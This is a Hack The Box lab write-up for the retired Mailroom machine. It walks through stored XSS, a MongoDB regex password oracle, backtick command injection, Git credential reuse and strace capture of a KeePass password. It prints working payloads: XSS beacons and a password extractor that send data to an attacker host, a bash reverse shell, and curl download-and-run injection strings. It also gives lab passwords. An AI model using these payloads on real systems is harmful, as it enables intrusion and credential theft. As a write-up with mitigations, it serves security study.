---
title: "Hack The Box — Mailroom"
summary: "A practical Mailroom walkthrough chaining stored XSS, internal SSRF, MongoDB injection, container command injection, and KeePass keystroke capture."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Hard"
os: "Linux"
solvedAt: 2026-09-04
publishedAt: 2026-09-04
tags:
  - stored-xss
  - ssrf
  - nosql-injection
  - mongodb
  - source-code-review
  - command-injection
  - docker
  - lateral-movement
  - keepass
  - linux-privilege-escalation
tools:
  - Nmap
  - curl
  - ffuf
  - Feroxbuster
  - Git
  - JavaScript
  - Python
  - Netcat
  - SSH
  - strace
  - kpcli
cves: []
htbUrl: "https://app.hackthebox.com/machines/538"
cover: "/images/writeups/hackthebox/machines/mailroom/mailroom.png"
coverAlt: "Hack The Box Mailroom artwork showing a mail carrier holding an envelope"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box machine Mailroom. The commands and credentials belong only to that isolated lab. Flags, VPN data, session tokens, personal paths and session-specific IP addresses have been removed.

## About this write-up

This is a reconstruction of my hands-on solve on 4 September 2026. It follows the order in which I actually worked: network discovery, web and virtual-host enumeration, source review, a stored-XSS callback, several unsuccessful browser payloads, credential recovery, SSH access, a protected internal panel, command injection, a container escape path through reused credentials, and finally the KeePass privilege-escalation route.

The retained terminal evidence confirms the chain through access as `matthew`, including the first flag location. My initial `strace` attempts then attached too late or destabilized the short-lived `kpcli` process. I used the official HTB write-up to verify the intended keystroke-capture technique and the final KeePass-to-root transition. I mark that boundary explicitly rather than presenting it as independently captured output.

The [Hack The Box machine page](https://www.hackthebox.com/machines/mailroom) identified Mailroom as a retired Hard Linux machine on the publication date, so this solution is eligible for public release.

## Machine information

| Item | Value |
| --- | --- |
| Machine | Mailroom |
| Platform | Hack The Box |
| Difficulty | Hard |
| Operating system | Linux |
| Released | 15 April 2023 |
| Publication status | Retired — verified 4 September 2026 |
| Target address | `<TARGET_IP>` — session-specific value removed |
| Attacker address | `<ATTACKER_IP>` — VPN value removed |

## Executive summary

Mailroom begins with only SSH and an Apache website exposed. Virtual-host discovery reveals a public Gitea repository whose PHP source discloses an internal review panel and two important flaws. First, contact messages are rendered without safe output encoding, producing stored XSS in a staff member's browser. Second, the panel passes structured POST parameters directly into a MongoDB query. JavaScript delivered through the XSS can therefore reach the internal-only application and use a response-length oracle to recover Tristan's password one character at a time.

The SSH foothold exposes a 2FA link in Tristan's local mailbox. Port forwarding makes the protected review panel reachable, where a missing backtick in a command filter permits shell command substitution. This produces a `www-data` shell inside a Docker container. Its Git configuration contains Matthew's Gitea password, which is reused for the host account. As Matthew, a recurring `kpcli` process can be traced because it runs under the same UID; capturing its terminal reads reveals the KeePass master password. The database then supplies the final root credential.

## Attack path

| Stage | Evidence and result |
| --- | --- |
| Network discovery | Nmap found SSH on 22/tcp and Apache on 80/tcp |
| Virtual-host discovery | `ffuf` found `git.mailroom.htb` |
| Source review | Public Gitea repository exposed the internal panel, unsafe MongoDB query and command construction |
| Stored XSS | A staff browser requested our hosted JavaScript from the target |
| Internal request + NoSQL injection | A synchronous response oracle recovered Tristan's lab password |
| Host foothold | The recovered password authenticated over SSH as `tristan` |
| 2FA and tunnelling | Tristan's mailbox supplied a one-time link for the loopback-only review panel |
| Command injection | Backtick substitution in the inspection feature produced a container shell as `www-data` |
| Credential reuse | `.git/config` exposed Matthew's URL-encoded Gitea password, also valid for `su` |
| KeePass tracing | The process was observed and tracing was attempted; the successful capture and final root transition are official-write-up-assisted |

## Environment setup

I used placeholders below so the write-up does not publish a personal VPN address or an ephemeral HTB target address:

```bash
export TARGET_IP='<TARGET_IP>'
export ATTACKER_IP='<ATTACKER_IP>'
```

After the primary hostname was identified, I added it locally:

```bash
echo "$TARGET_IP mailroom.htb" | sudo tee -a /etc/hosts
```

## Initial enumeration

I began with default scripts, service detection and a full TCP port range:

```bash
nmap "$TARGET_IP" -T5 -sVC -p-
```

The useful part of the output was small:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.54 (Debian)
|_http-title: The Mail Room
```

The mixed Ubuntu SSH and Debian Apache fingerprints suggested that at least part of the web stack might be containerized. With only two exposed services, the web application was the natural first target.

### Content discovery

Manual browsing showed a small corporate site with an inquiry form. `feroxbuster` confirmed the main PHP surface:

```bash
feroxbuster -u http://mailroom.htb -x php,txt,html
```

The scan found pages such as:

```text
/index.php
/about.php
/contact.php
/services.php
```

I stopped the heavily recursive scan once it began repeating static paths. The contact form was more interesting because it explicitly said that submitted messages would be reviewed.

## Virtual-host discovery and Gitea

I fuzzed the `Host` header and filtered the baseline response size:

```bash
ffuf -u http://mailroom.htb/ \
  -H 'Host: FUZZ.mailroom.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <BASELINE_SIZE>
```

This identified `git.mailroom.htb`. After adding it to `/etc/hosts`, the Gitea API exposed a public repository:

```bash
echo "$TARGET_IP git.mailroom.htb" | sudo tee -a /etc/hosts

curl -s 'http://git.mailroom.htb/api/v1/repos/search?limit=50' |
  jq '.data[] | {repository: .full_name, clone_url: .clone_url}'
```

```json
{
  "repository": "matthew/staffroom",
  "clone_url": "http://git.mailroom.htb/matthew/staffroom.git"
}
```

I cloned the repository and reviewed both the current tree and its history:

```bash
git clone http://git.mailroom.htb/matthew/staffroom.git
cd staffroom
git log --oneline --all
rg -n 'Mongo|findOne|shell_exec|staff-review|password|email' .
```

Two findings shaped the rest of the solve:

1. `auth.php` built a MongoDB query directly from `$_POST['email']` and `$_POST['password']`, allowing PHP array notation such as `password[$regex]` to become a query operator.
2. The source referenced `staff-review-panel.mailroom.htb`, an internal panel that returned `403 Forbidden` when requested directly from my host.

The repository also showed that inquiry content reached staff-facing pages without reliable context-aware output encoding. That connected the public contact form to a stored-XSS opportunity.

## Stored XSS confirmation

I first tested a minimal callback rather than immediately running a credential extractor. I started a web server:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Then I placed a small image error handler in the inquiry message:

```html
<img src=x onerror="fetch('http://<ATTACKER_IP>:8000/xss-confirmed')">
```

The listener received a request from the target:

```text
<TARGET_IP> - - "GET /xss-confirmed HTTP/1.1" 404 -
```

The `404` was expected because the path was only a beacon. The important result was that a browser on the target executed our JavaScript, confirming stored XSS.

## Turning XSS into an internal NoSQL oracle

The attack required three pieces to work together:

- the staff browser could load attacker-controlled JavaScript;
- that browser could reach the otherwise restricted review panel;
- `auth.php` accepted MongoDB operators through PHP's nested parameter syntax.

I hosted `exploit.js` and submitted an external script tag through the contact form:

```html
<script src="http://<ATTACKER_IP>:8000/exploit.js?v=final"></script>
```

### What did not work

My first scripts targeted Matthew's email address and used asynchronous `fetch()` calls. The callbacks proved that the script loaded and the internal endpoint was reachable, but the authentication test stayed false:

```text
GET /v2-script-loaded?... HTTP/1.1
GET /v2-internal-reachable?... HTTP/1.1
GET /v2-response-readable-false?... HTTP/1.1
```

Later versions only reported that they had started. Two assumptions were wrong:

1. The login target was Tristan, not Matthew. Gitea's public user enumeration exposed both names, but the staff workflow belonged to `tristan@mailroom.htb`.
2. A long asynchronous loop was unreliable inside the short-lived review context. A synchronous request made the response-length oracle deterministic.

### Working extractor

The final logic tested progressively longer regular-expression prefixes. The values `130` and `301` were the observed success and failure response lengths for the internal application in the reference flow.

```javascript
const alphabet =
  '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#<=>@_';
let password = '';

function matches(prefix) {
  const xhr = new XMLHttpRequest();
  xhr.open(
    'POST',
    'http://staff-review-panel.mailroom.htb/auth.php',
    false
  );
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

  const body =
    'email=' + encodeURIComponent('tristan@mailroom.htb') +
    '&password%5B%24regex%5D=' + encodeURIComponent('^' + prefix + '.*');

  xhr.send(body);
  return xhr.responseText.length === 130;
}

while (true) {
  let advanced = false;

  for (const candidate of alphabet) {
    if (matches(password + candidate)) {
      password += candidate;
      advanced = true;
      break;
    }
  }

  if (!advanced) break;
}

new Image().src =
  'http://<ATTACKER_IP>:8000/result?password=' + encodeURIComponent(password);
```

The oracle recovered the lab-only password:

```text
tristan : 69trisRulez!
```

This extraction is where the official write-up helped correct my unsuccessful scripts. The subsequent SSH authentication with the recovered value was confirmed in the live session.

## Initial foothold as Tristan

```bash
ssh tristan@"$TARGET_IP"
```

After authentication:

```bash
id
sudo -l
```

```text
uid=1000(tristan) gid=1000(tristan) groups=1000(tristan)
Sorry, user tristan may not run sudo on mailroom.
```

Tristan could list Matthew's home directory but could not read the first flag:

```text
/home/matthew/
├── personal.kdbx
└── user.txt     [permission denied]
```

This ruled out a direct sudo route and pointed back to application-specific artifacts.

## Mailbox, 2FA and the internal panel

Local mail enumeration revealed a 2FA message for the staff review panel:

```bash
sed -n '1,220p' /var/mail/tristan
```

The token is intentionally removed from this write-up. To reach the loopback-only virtual host safely, I forwarded the target's port 80 to local port 8080:

```bash
ssh -L 127.0.0.1:8080:127.0.0.1:80 tristan@"$TARGET_IP"
```

I temporarily resolved the staff hostname to the tunnel endpoint:

```text
127.0.0.1 staff-review-panel.mailroom.htb
```

The 2FA link then opened:

```text
http://staff-review-panel.mailroom.htb:8080/<REDACTED_2FA_PATH>
```

The authenticated dashboard greeted `tristan` and exposed an **Inspect** feature for reviewing inquiries.

## Command injection in the inspection tool

Source review showed that the inspection page passed a user-controlled value into `shell_exec()`. It tried to reject shell metacharacters, but the denylist omitted the backtick. In a shell command, backticks perform command substitution, so a value that passed validation could still execute an embedded command.

I prepared a reverse-shell script on Kali:

```bash
#!/usr/bin/env bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/10001 0>&1'
```

Then I served it and started a listener:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
rlwrap nc -lvnp 10001
```

Through the Inspect input, I used backtick substitution first to download the script and then to execute it:

```text
http://127.0.0.1/`curl http://<ATTACKER_IP>:8000/shell.sh -o /tmp/shell.sh`
http://127.0.0.1/`bash /tmp/shell.sh`
```

The listener received a shell:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname: <CONTAINER_ID>
cwd: /var/www/staffroom
```

The hostname and Debian web fingerprint confirmed the earlier suspicion: this shell was inside the staffroom Docker container, not directly on the host.

## Container enumeration and credential recovery

The application directory included its Git metadata:

```bash
cd /var/www/staffroom
ls -la
cat .git/config
```

The remote URL embedded a username and a URL-encoded password:

```ini
[remote "origin"]
    url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
```

`%23` decodes to `#`, giving the lab credential:

```text
matthew : HueLover83#
```

This was not a container escape in the kernel-exploitation sense. It was a trust-boundary failure: source-control credentials were stored in a deployed checkout and the same password was valid for a host account.

## Lateral movement to Matthew

Back in Tristan's host shell, the recovered password worked with `su`:

```bash
su - matthew
```

The transition succeeded, and Matthew could read `/home/matthew/user.txt`. The flag value is intentionally omitted.

Local enumeration showed:

```bash
ls -la ~
sudo -l
```

```text
personal.kdbx
personal.kdbx.lock
.kpcli-history -> /dev/null
Sorry, user matthew may not run sudo on mailroom.
```

The lock file indicated that the KeePass database was being opened, while the history symlink prevented easy command-history recovery. Process monitoring revealed recurring `kpcli` execution under Matthew's UID.

## Privilege escalation through KeePass keystroke capture

Linux normally permits a process to trace another process with the same effective user, subject to the system's `ptrace` policy. Because we controlled Matthew's account and `kpcli` also ran as Matthew, `strace` could observe the program's reads from standard input.

### Failed capture attempts

My first loop found a `kpcli` PID and attached successfully, but it did so after the master password had already been entered:

```bash
strace -f -s 256 -e trace=read,write -p "$pid" 2>&1 |
  tee /tmp/kpcli.strace
```

Filtering for `read(0, ...)` returned nothing. A more aggressive retry used `-f` against the short-lived process and repeatedly produced:

```text
Trace/breakpoint trap (core dumped)
```

A later attachment captured Perl module initialization and the `kpcli:/>` prompt, but again missed the password bytes. These failures mattered: attaching after initialization or tracing child behavior indiscriminately was not enough. The watcher needed to catch a fresh process early and focus on file descriptor 0.

### Intended capture method — official-write-up-assisted

The official route attaches without `-f` while a fresh `kpcli` process is accepting input and limits the trace to reads and writes:

```bash
strace -p "$(pgrep kpcli)" -e write -e read 2>&1 | tee output.txt
```

The useful string can be reduced from the trace with the same parsing pipeline I had already tried against my late capture:

```bash
awk -F ',' '{print $2}' output.txt |
  grep -v 0x |
  tr -d '" ' |
  paste -sd ''
```

The master password is entered one character at a time. The official capture also included an octal `\\10` backspace after a mistyped `1`, so the stream must be reconstructed as terminal input rather than blindly concatenated. The resulting retired-lab KeePass password is:

```text
!sECUr3p4$$w0rd9
```

The database can then be opened interactively:

```bash
kpcli --kdb ~/personal.kdbx
```

Inside `kpcli`, listing the database and displaying the privileged entry reveals the lab-only root password:

```text
a$gBa3!GA8
```

The final transition is:

```bash
su -
id
```

The expected result is UID 0 and access to `/root/root.txt`. The root flag is omitted. This last password-capture and root-login sequence is reconstructed from the supplied official write-up; the retained live transcript does not contain an independently confirmed root shell, so I do not label it as one.

## Completion status

| Milestone | Status |
| --- | --- |
| Stored XSS execution | Executed and confirmed |
| Internal panel reachability | Executed and confirmed |
| Early asynchronous extractor variants | Executed but unsuccessful |
| Tristan credential extraction | Official-write-up-assisted; SSH use confirmed |
| SSH as Tristan | Executed and confirmed |
| Staff panel access through 2FA and forwarding | Executed and confirmed |
| Container shell as `www-data` | Executed and confirmed |
| Git credential recovery | Executed and confirmed |
| Lateral movement to Matthew | Executed and confirmed |
| User flag access | Confirmed; value removed |
| `kpcli` discovery and tracing attempts | Executed and confirmed |
| Successful keystroke reconstruction and root login | Reconstructed from the official write-up; not independently captured in the retained transcript |

## Key takeaways

- Public source code can expose both hidden attack surface and the exact data flow needed to exploit it.
- Stored XSS becomes much more serious when a privileged reviewer can reach services that external attackers cannot.
- Blind NoSQL injection needs only a stable boolean signal. Response length was enough to recover a password prefix by prefix.
- Denylists are fragile for shell safety. Missing a single metacharacter — here, the backtick — restored arbitrary command execution.
- Secrets in `.git/config` are deployment secrets, even if they appear only inside a remote URL.
- Password reuse converted a container compromise into a host-user compromise.
- Same-user process tracing can expose secrets typed into terminal applications. Short-lived processes require careful timing and narrow tracing.
- Failed exploit versions are useful evidence: they reveal incorrect identity assumptions, browser-lifecycle constraints and race conditions.

## Mitigations

| Weakness | Defensive action |
| --- | --- |
| Stored XSS in inquiries | Apply context-aware output encoding, sanitize permitted markup and deploy a restrictive Content Security Policy |
| Privileged browser can reach internal services | Separate review workloads, restrict browser egress and avoid using privileged users for untrusted-content rendering |
| MongoDB operator injection | Enforce scalar request schemas, reject unexpected arrays/operators and build explicit typed queries |
| Response oracle | Return uniform authentication responses and rate-limit repeated failures |
| Shell command injection | Avoid shell invocation; use a native HTTP client with strict URL parsing and an explicit allowlist |
| Credentials in Git remote | Use scoped deploy credentials outside the working tree and rotate exposed secrets |
| Password reuse | Require unique credentials across Gitea, containers and host accounts |
| Same-user `ptrace` exposure | Reduce unnecessary scheduled secret entry, harden `ptrace_scope`, and isolate automation identities |
| Privileged password in KeePass | Prefer non-interactive secret management with least-privilege access and auditable retrieval |

## Tools used

- **Nmap** — TCP discovery, default scripts and service/version detection
- **curl** and **jq** — HTTP validation and Gitea API enumeration
- **Feroxbuster** — initial PHP content discovery
- **ffuf** — virtual-host discovery
- **Git** and **ripgrep** — repository history and source-code review
- **JavaScript** — stored-XSS payload and MongoDB response oracle
- **Python HTTP server** — hosted the browser payload and reverse-shell script
- **Netcat** — received the container reverse shell
- **SSH** — host access and local port forwarding
- **strace** — observed same-user `kpcli` input reads
- **kpcli** — opened and inspected the KeePass database

## References

- [Hack The Box — Mailroom](https://www.hackthebox.com/machines/mailroom)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MongoDB `$regex` query operator](https://www.mongodb.com/docs/manual/reference/operator/query/regex/)
- [PHP manual — `shell_exec`](https://www.php.net/manual/en/function.shell-exec.php)
- [strace manual](https://man7.org/linux/man-pages/man1/strace.1.html)
- [KeePassXC documentation — KeePass database format compatibility](https://keepassxc.org/docs/)

Return to the [Hack The Box write-ups archive](/writeups/).
